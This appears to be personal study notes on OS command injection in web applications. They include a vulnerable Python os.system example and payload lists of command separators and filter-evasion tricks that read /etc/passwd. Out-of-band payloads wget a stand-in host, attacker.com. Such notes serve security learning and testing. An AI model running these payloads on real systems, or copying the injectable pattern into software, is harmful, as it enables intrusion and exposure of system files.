In command injection, a web application generate bash commands, including data from client. A malicious user adds custom command that **modify** the normal operation of the web application. In a short word, unsafe user supplied data to system shell. the severity is commonly considered as a critical issue.

![[Pasted image 20260516180351.png]]

But why web application need to interact with shell? there are many scenarios:
- Converting an image
- Calling External web service
- Converting video
- Calling a binary

> [!Example]+ video_name comes from user input
> ```
> os.system("/bin/ffmpeg -i {} -c:a copy -c:v vp9 -r 30 /files/user/{}/videos".format(video_name,session.get('user_id')))
>```

####  Phase  0x01 Detection

the detection phase is about to fuzz the suspicious input,there are some command separators, a useful list can be found here

> [!danger] Payload 0x01
> ```bash
> ; cat /etc/passwd
> && cat /etc/passwd
> | cat /etc/passwd
> || cat /etc/passwd
> `cat /etc/passwd
> $(cat /etc/passwd)
> {cat,/etc/passwd}
> cat$IFS/etc/passwd
> cat $(HOME:0:1)etc$(HOME:0:1)passwd
> ```

#### OOB Technique

Out-of-band technique in command injection involves the attacker's ability to send data outside the application's normal communication channels. this can be done through DNS requests, HTTPS requests, or other means. 
the attacker can then use this channel to receive data from exploited  system, such as the output of a command executed through the command injection vulnerability. this technique can useful when the application does not return the output of the injected command, or when the output is not easily accessible by attacker.

> [!info] Payload 0x02
> ```bash
> ; wget http://attacker.com/OOB
> && wget http://attacker.com/OOB
> | wget http://attacker.com/OOB
> || wget http://attacker.com/OOB
> `wget http://attacker.com/OOB
> $(wget http://attacker.com/OOB)
> {wget,http://attacker.com/OOB}
> ```

